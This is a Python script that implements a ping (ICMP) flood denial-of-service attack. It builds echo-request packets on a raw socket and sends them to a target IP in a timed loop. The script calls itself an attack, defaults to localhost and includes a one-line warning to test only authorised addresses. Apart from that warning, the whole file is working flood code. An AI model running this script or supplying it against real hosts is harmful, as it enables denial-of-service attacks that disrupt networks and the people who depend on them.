import socket
import random
import time
import struct
import os

def checksum(source_string):
    """
    Calculates the checksum of the given data.
    ICMP packets require a checksum in the header.
    """
    sum = 0
    count_to = (len(source_string) // 2) * 2
    count = 0
    while count < count_to:
        this_val = source_string[count + 1] * 256 + source_string[count]
        sum = sum + this_val
        sum = sum & 0xffffffff 
        count = count + 2

    if count_to < len(source_string):
        sum = sum + source_string[len(source_string) - 1]
        sum = sum & 0xffffffff 

    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def ping_flood(target_ip, duration):
    """
    Executes a Ping (ICMP) flood attack for a specified duration.
    Requires root/administrator privileges to run.
    """
    if os.geteuid() != 0:
        print("Root privileges are required to run this script (for creating a raw socket). Please run with sudo.")
        return

    # Create a raw socket with the ICMP protocol
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error as e:
        print(f"Socket could not be created. Error: {e}")
        return

    timeout = time.time() + duration
    sent_packets = 0
    
    # Generate some random data for the packet payload
    packet_data = b"X" * 56 # Standard ping payload size

    print(f"Starting Ping (ICMP) flood on {target_ip} for {duration} seconds...")

    try:
        while time.time() < timeout:
            # --- Construct the ICMP Packet ---
            # Header is type (8), code (8), checksum (16), id (16), sequence (16)
            
            icmp_type = 8  # 8 for Echo Request
            icmp_code = 0
            icmp_checksum = 0 # Placeholder for now
            icmp_id = random.randint(1, 65535) # Or a fixed ID
            icmp_sequence = 1

            # Pack the header without the checksum
            header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_sequence)

            # Calculate the real checksum on the header and data
            real_checksum = checksum(header + packet_data)
            
            # Repack the header with the correct checksum
            header = struct.pack("!BBHHH", icmp_type, icmp_code, socket.htons(real_checksum), icmp_id, icmp_sequence)

            # Final packet
            packet = header + packet_data
            
            # Send the ICMP packet
            client.sendto(packet, (target_ip, 1)) # Port 1 is arbitrary for raw ICMP
            sent_packets += 1
            
    except PermissionError:
        print("Permission denied. You need to run this script as root (with sudo).")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        print(f"Attack finished. Sent {sent_packets} packets.")
        client.close()

if __name__ == '__main__':
    # --- Configuration ---
    # WARNING: Only use an IP address that you are authorized to test.
    target_ip = "127.0.0.1"
    attack_duration = 10      # Duration of the attack in seconds

    ping_flood(target_ip, attack_duration)


